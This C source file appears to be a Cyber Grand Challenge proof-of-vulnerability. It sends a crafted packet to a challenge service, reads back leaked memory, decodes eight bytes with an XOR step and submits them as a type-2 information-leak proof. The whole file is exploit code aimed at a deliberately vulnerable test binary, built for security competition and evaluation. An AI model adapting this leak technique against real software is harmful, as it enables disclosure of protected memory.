#include "libpov.h"

/*
1\n4 2\n2\n\x20\x00\x00\x00\x64\x75\x61\x2e\x18\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x1f\x00\x00\x01\x00\x00\x00AAAAAAAA\n3\n1\n9\n
*/
static void cgc_transmit_string(const char *s)
{
    cgc_transmit_all(STDOUT, s, cgc_strlen(s));
}

static char pkt[] = "\x64\x75\x61\x2e\x18\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x1f\x00\x00\x01\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF";

int main(int cgc_argc, char *cgc_argv[])
{
    int i;
    unsigned char buf[1024];
    unsigned char value[8];
    cgc_size_t bytes;
    type2_vals t2;
    cgc_type2_negotiate(&t2);

    cgc_transmit_string("1\n");
    cgc_transmit_string("4 2\n");
    cgc_transmit_string("2\n");
    cgc_transmit_all(STDOUT, "\x20\x00\x00\x00", 4);
    cgc_random(&pkt[0x18], 8, &bytes);
    cgc_transmit_all(STDOUT, pkt, 32);
    cgc_transmit_string("3\n");
    cgc_transmit_string("1\n");
    cgc_transmit_string("9\n");

    cgc_length_read(STDIN, buf, 0x31b);
    cgc_length_read(STDIN, buf, 4);
    if (*(unsigned int *)buf >= 0x40)
    {
        cgc_length_read(STDIN, buf, 0x40);
        value[0] = buf[0x28];
        value[1] = buf[0x29];
        value[2] = buf[0x2a];
        value[3] = buf[0x2b];
        value[4] = buf[0x30];
        value[5] = buf[0x31];
        value[6] = buf[0x32];
        value[7] = buf[0x33];
        for (i = 7; i > 0; i--)
            value[i] ^= (value[i-1] >> 1) ^ 0x55;
    }
    cgc_type2_submit(value + 4, 4);
    return 0;
}
